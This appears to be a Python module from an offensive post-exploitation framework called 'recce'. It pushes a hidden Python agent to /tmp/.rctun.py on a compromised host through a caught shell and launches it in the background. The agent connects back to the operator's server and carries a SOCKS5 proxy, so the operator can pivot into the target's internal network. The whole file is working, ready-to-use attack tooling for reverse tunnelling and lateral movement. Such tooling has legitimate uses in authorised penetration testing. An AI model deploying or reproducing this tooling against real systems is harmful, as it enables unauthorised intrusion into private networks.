"""Reverse tunnel through a caught shell — SOCKS5 proxy + port forwards.

Deploys a tiny stdlib-only Python agent to the target via the shell session.
The agent connects BACK to the recce server over a dedicated port and speaks a
simple frame-multiplexed protocol.  On the recce side an asyncio SOCKS5 proxy
(or a specific port-forward listener) bridges local connections through the
tunnel so the operator's tools reach the target's internal network.

    operator  -->  recce:1080 (SOCKS5)  --[tunnel]--> agent on target --> internal net

No external tools needed on the target — just Python 3 (already required for
recce's PTY stager).  Cleanup kills the agent and removes its script.
"""
from __future__ import annotations

import asyncio
import logging
import struct
from typing import Callable

log = logging.getLogger("recce.tunnel")

# --- frame protocol (shared with the agent) ------------------------------------
OPEN, DATA, CLOSE, OPEN_OK, OPEN_FAIL = 1, 2, 3, 4, 5
HEADER_SIZE = 9  # 1B type + 4B chan_id + 4B length
HANDSHAKE = b"RECCETUN1"


def _pack(typ: int, chan_id: int, payload: bytes = b"") -> bytes:
    return struct.pack("!BII", typ, chan_id, len(payload)) + payload


# --- agent script (runs on the target) -----------------------------------------
AGENT_SCRIPT = r'''#!/usr/bin/env python3
"""recce tunnel agent — reverse multiplexed tunnel back to the recce server."""
import socket,struct,threading,sys,os,time
H,P=sys.argv[1],int(sys.argv[2])
OPEN,DATA,CLOSE,OPEN_OK,OPEN_FAIL=1,2,3,4,5
chans={}
lk=threading.Lock()
ctrl=None
def sf(t,c,p=b""):
 f=struct.pack("!BII",t,c,len(p))+p
 with lk:
  try:ctrl.sendall(f)
  except:pass
def rx(s,n):
 b=b""
 while len(b)<n:
  c=s.recv(n-len(b))
  if not c:return None
  b+=c
 return b
def reader(ci,sk):
 try:
  while 1:
   d=sk.recv(8192)
   if not d:break
   sf(DATA,ci,d)
 except:pass
 sf(CLOSE,ci)
 try:sk.close()
 except:pass
 with lk:chans.pop(ci,None)
def do_open(ci,pay):
 t=pay.decode("utf-8","replace")
 hp=t.rsplit(":",1)
 try:
  sk=socket.create_connection((hp[0],int(hp[1])),timeout=15)
  with lk:chans[ci]=sk
  sf(OPEN_OK,ci)
  threading.Thread(target=reader,args=(ci,sk),daemon=True).start()
 except Exception as e:
  sf(OPEN_FAIL,ci,str(e).encode()[:250])
def main():
 global ctrl
 for _ in range(30):
  try:ctrl=socket.create_connection((H,P),timeout=10);break
  except:time.sleep(1)
 else:sys.exit(1)
 ctrl.settimeout(None)
 ctrl.sendall(b"RECCETUN1")
 while 1:
  hdr=rx(ctrl,9)
  if hdr is None:break
  ty,ci,ln=struct.unpack("!BII",hdr)
  pay=rx(ctrl,ln) if ln else b""
  if pay is None:break
  if ty==OPEN:threading.Thread(target=do_open,args=(ci,pay),daemon=True).start()
  elif ty==DATA:
   with lk:sk=chans.get(ci)
   if sk:
    try:sk.sendall(pay)
    except:pass
  elif ty==CLOSE:
   with lk:sk=chans.pop(ci,None)
   if sk:
    try:sk.close()
    except:pass
if __name__=="__main__":main()
'''


# --- server-side tunnel multiplexer -------------------------------------------

class TunnelMux:
    """Manages the multiplexed tunnel connection to the agent."""

    def __init__(self, reader: asyncio.StreamReader, writer: asyncio.StreamWriter):
        self._r = reader
        self._w = writer
        self._next_chan = 1
        self._waiters: dict[int, asyncio.Future] = {}
        self._channels: dict[int, asyncio.Queue] = {}
        self._lock = asyncio.Lock()
        self._closed = False
        self._pump_task: asyncio.Task | None = None

    async def start(self):
        self._pump_task = asyncio.ensure_future(self._pump())

    async def _pump(self):
        """Read frames from the agent and dispatch."""
        try:
            while not self._closed:
                header = await self._r.readexactly(HEADER_SIZE)
                typ, chan_id, length = struct.unpack("!BII", header)
                payload = await self._r.readexactly(length) if length else b""

                if typ == DATA:
                    q = self._channels.get(chan_id)
                    if q:
                        await q.put(payload)
                elif typ == OPEN_OK:
                    fut = self._waiters.pop(chan_id, None)
                    if fut and not fut.done():
                        fut.set_result(True)
                elif typ == OPEN_FAIL:
                    fut = self._waiters.pop(chan_id, None)
                    if fut and not fut.done():
                        fut.set_result(False)
                elif typ == CLOSE:
                    q = self._channels.pop(chan_id, None)
                    if q:
                        await q.put(None)  # EOF sentinel
                    fut = self._waiters.pop(chan_id, None)
                    if fut and not fut.done():
                        fut.set_result(False)
        except (asyncio.IncompleteReadError, ConnectionError, OSError):
            pass
        finally:
            self._closed = True
            for fut in self._waiters.values():
                if not fut.done():
                    fut.set_result(False)
            for q in self._channels.values():
                await q.put(None)

    async def open_channel(self, host: str, port: int, timeout: float = 15.0) -> int | None:
        """Ask the agent to connect to host:port.  Returns channel_id on success."""
        async with self._lock:
            chan_id = self._next_chan
            self._next_chan += 1

        self._channels[chan_id] = asyncio.Queue()
        loop = asyncio.get_event_loop()
        fut: asyncio.Future = loop.create_future()
        self._waiters[chan_id] = fut

        frame = _pack(OPEN, chan_id, f"{host}:{port}".encode())
        self._w.write(frame)
        await self._w.drain()

        try:
            ok = await asyncio.wait_for(fut, timeout)
        except asyncio.TimeoutError:
            ok = False

        if not ok:
            self._channels.pop(chan_id, None)
            return None
        return chan_id

    async def send_data(self, chan_id: int, data: bytes):
        frame = _pack(DATA, chan_id, data)
        self._w.write(frame)
        await self._w.drain()

    async def recv_data(self, chan_id: int) -> bytes | None:
        """Returns data bytes, or None on EOF/close."""
        q = self._channels.get(chan_id)
        if not q:
            return None
        return await q.get()

    async def close_channel(self, chan_id: int):
        self._channels.pop(chan_id, None)
        frame = _pack(CLOSE, chan_id)
        try:
            self._w.write(frame)
            await self._w.drain()
        except (ConnectionError, OSError):
            pass

    async def shutdown(self):
        self._closed = True
        if self._pump_task:
            self._pump_task.cancel()
        try:
            self._w.close()
            await self._w.wait_closed()
        except (ConnectionError, OSError):
            pass

    @property
    def alive(self) -> bool:
        return not self._closed


# --- SOCKS5 proxy (runs on recce server, bridges through TunnelMux) -----------

async def _socks5_handle(reader: asyncio.StreamReader, writer: asyncio.StreamWriter,
                         mux: TunnelMux):
    """Handle one SOCKS5 client connection."""
    peer = writer.get_extra_info("peername")
    try:
        # greeting: version + nauth + methods
        greeting = await asyncio.wait_for(reader.read(258), 5.0)
        if len(greeting) < 3 or greeting[0] != 0x05:
            return
        # reply: no-auth
        writer.write(b"\x05\x00")
        await writer.drain()

        # request: ver + cmd + rsv + atyp + dst + port
        header = await asyncio.wait_for(reader.readexactly(4), 5.0)
        ver, cmd, _, atyp = header
        if ver != 0x05 or cmd != 0x01:  # only CONNECT
            writer.write(b"\x05\x07\x00\x01\x00\x00\x00\x00\x00\x00")
            await writer.drain()
            return

        if atyp == 0x01:  # IPv4
            raw = await reader.readexactly(4)
            dst_host = ".".join(str(b) for b in raw)
        elif atyp == 0x03:  # domain
            dlen = (await reader.readexactly(1))[0]
            dst_host = (await reader.readexactly(dlen)).decode("ascii", "replace")
        elif atyp == 0x04:  # IPv6
            raw = await reader.readexactly(16)
            dst_host = ":".join(f"{raw[i]:02x}{raw[i+1]:02x}" for i in range(0, 16, 2))
        else:
            writer.write(b"\x05\x08\x00\x01\x00\x00\x00\x00\x00\x00")
            await writer.drain()
            return

        dst_port = struct.unpack("!H", await reader.readexactly(2))[0]

        # open channel through the tunnel
        chan_id = await mux.open_channel(dst_host, dst_port)
        if chan_id is None:
            writer.write(b"\x05\x05\x00\x01\x00\x00\x00\x00\x00\x00")
            await writer.drain()
            return

        # success reply
        writer.write(b"\x05\x00\x00\x01\x00\x00\x00\x00\x00\x00")
        await writer.drain()

        # bridge: client <-> tunnel channel
        async def client_to_tunnel():
            try:
                while True:
                    data = await reader.read(8192)
                    if not data:
                        break
                    await mux.send_data(chan_id, data)
            except (ConnectionError, OSError):
                pass
            await mux.close_channel(chan_id)

        async def tunnel_to_client():
            try:
                while True:
                    data = await mux.recv_data(chan_id)
                    if data is None:
                        break
                    writer.write(data)
                    await writer.drain()
            except (ConnectionError, OSError):
                pass

        await asyncio.gather(client_to_tunnel(), tunnel_to_client())
    except (asyncio.TimeoutError, asyncio.IncompleteReadError, ConnectionError, OSError):
        pass
    finally:
        try:
            writer.close()
            await writer.wait_closed()
        except (ConnectionError, OSError):
            pass


# --- tunnel state (one active tunnel per session) ------------------------------

class TunnelState:
    """Tracks an active tunnel: listener, mux, SOCKS proxy, agent PID."""

    def __init__(self):
        self.tunnel_port: int = 0
        self.socks_port: int = 0
        self.agent_pid: str = ""
        self.agent_path: str = ""
        self.mux: TunnelMux | None = None
        self.tunnel_server: asyncio.AbstractServer | None = None
        self.socks_server: asyncio.AbstractServer | None = None
        self._agent_connected = asyncio.Event()

    @property
    def alive(self) -> bool:
        return self.mux is not None and self.mux.alive


_tunnels: dict[str, TunnelState] = {}  # session_id -> TunnelState


async def start_tunnel(session, push_file_fn, socks_port: int = 1080,
                       on_event: Callable | None = None) -> TunnelState:
    """Deploy the tunnel agent and start the SOCKS5 proxy.

    `session` must be a live Session with send() and run_and_capture().
    `push_file_fn` writes a file to the target through the shell.
    """
    if session.id in _tunnels and _tunnels[session.id].alive:
        raise RuntimeError("tunnel already active for this session")

    if not session.connected:
        raise RuntimeError("shell not connected")
    if not session.local_addr:
        raise RuntimeError("cannot determine callback address")

    lhost = session.local_addr[0]
    state = TunnelState()

    # 1. start the tunnel listener (pick an available port)
    async def on_agent_connect(reader: asyncio.StreamReader, writer: asyncio.StreamWriter):
        # verify handshake
        try:
            hs = await asyncio.wait_for(reader.readexactly(len(HANDSHAKE)), 10.0)
        except (asyncio.TimeoutError, asyncio.IncompleteReadError):
            writer.close()
            return
        if hs != HANDSHAKE:
            writer.close()
            return
        state.mux = TunnelMux(reader, writer)
        await state.mux.start()
        state._agent_connected.set()
        log.info("tunnel agent connected from %s", session.host_ip)

    state.tunnel_server = await asyncio.start_server(on_agent_connect, "0.0.0.0", 0)
    state.tunnel_port = state.tunnel_server.sockets[0].getsockname()[1]

    # 2. deploy the agent script
    agent_path = "/tmp/.rctun.py"
    state.agent_path = agent_path
    await push_file_fn(session, agent_path, AGENT_SCRIPT.encode())

    # 3. launch the agent in background
    import uuid
    marker = f"rctun_{uuid.uuid4().hex[:8]}"
    launch_cmd = (f"python3 {agent_path} {lhost} {state.tunnel_port} &"
                  f" RCPID=$!; echo {marker}_PID_$RCPID")
    out = await session.run_and_capture(launch_cmd.encode(), timeout=10.0)

    pid = ""
    for line in out.decode("ascii", "replace").split("\n"):
        if f"{marker}_PID_" in line:
            pid = line.split(f"{marker}_PID_")[1].strip()
            break
    state.agent_pid = pid

    # 4. wait for the agent to connect back
    try:
        await asyncio.wait_for(state._agent_connected.wait(), 15.0)
    except asyncio.TimeoutError:
        await _cleanup(state, session)
        raise RuntimeError(f"agent launched (PID {pid}) but didn't connect back — "
                           f"egress to {lhost}:{state.tunnel_port} may be blocked")

    # 5. start the SOCKS5 proxy
    for port_try in (socks_port, 0):
        try:
            state.socks_server = await asyncio.start_server(
                lambda r, w: _socks5_handle(r, w, state.mux),
                "127.0.0.1", port_try)
            break
        except OSError:
            if port_try == 0:
                raise
    state.socks_port = state.socks_server.sockets[0].getsockname()[1]

    _tunnels[session.id] = state
    log.info("tunnel active: SOCKS5 on 127.0.0.1:%d via %s (PID %s)",
             state.socks_port, session.host_ip, pid)
    if on_event:
        on_event({"type": "session", "event": "tunnel_start", "id": session.id})
    return state


async def _cleanup(state: TunnelState, session=None):
    """Tear down tunnel infrastructure."""
    if state.socks_server:
        state.socks_server.close()
        try:
            await state.socks_server.wait_closed()
        except Exception:
            pass
    if state.mux:
        await state.mux.shutdown()
    if state.tunnel_server:
        state.tunnel_server.close()
        try:
            await state.tunnel_server.wait_closed()
        except Exception:
            pass


async def stop_tunnel(session_id: str, session=None,
                      on_event: Callable | None = None) -> bool:
    """Stop an active tunnel and clean up the agent."""
    state = _tunnels.pop(session_id, None)
    if not state:
        return False

    # kill agent on target
    if session and session.connected and state.agent_pid:
        await session.send(
            f"kill {state.agent_pid} 2>/dev/null; rm -f {state.agent_path}\n".encode())

    await _cleanup(state, session)
    log.info("tunnel stopped for session %s", session_id)
    if on_event:
        on_event({"type": "session", "event": "tunnel_stop", "id": session_id})
    return True


def get_tunnel(session_id: str) -> TunnelState | None:
    """Get the active tunnel state for a session, if any."""
    state = _tunnels.get(session_id)
    if state and not state.alive:
        _tunnels.pop(session_id, None)
        return None
    return state
